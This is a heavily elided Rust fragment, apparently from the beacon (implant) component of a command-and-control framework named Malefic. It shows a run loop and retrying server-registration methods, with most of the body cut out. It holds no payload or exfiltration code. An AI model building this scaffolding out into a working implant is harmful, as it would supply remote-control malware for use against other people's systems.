...
impl MaleficBeacon {
    ...
    pub async fn run(&mut self) -> Result<(), ()> {
        ...
        loop {
            match self.run_once().await {
                ...
                Err(SessionError::RegisterFailed(_e)) => {
                    debug!("[beacon] Register failed: {:?}", _e);
                    self.apply_pending_switch().await;

                    if !self.server_manager.skip_target() {
    ...
    pub async fn run_once(&mut self) -> Result<(), SessionError> {
        ...
        self.register(&server_config).await?;
    ...
    /// Retries up to RETRY times before giving up.
    async fn register(&mut self, target: &Target) -> Result<(), SessionError> {
        enforce_guardrail();
        debug!("[beacon] Current target: {:#?}", target.server_config());

        let max_attempts = *malefic_config::RETRY;
        let mut last_err = malefic_transport::TransportError::ConnectionError;

        for attempt in 0..max_attempts {
            match self.try_register(target).await {
                Ok(()) => return Ok(()),
                Err(e) => {
                    last_err = e;
                    debug!(
                        "[beacon] Register attempt {}/{} failed: {:?}",
                        attempt + 1,
                        max_attempts,
                        last_err
                    );
        ...
        Err(SessionError::RegisterFailed(last_err))
    }
    ...
    async fn try_register(
        &mut self,
        target: &Target,
    ) -> Result<(), malefic_transport::TransportError> {
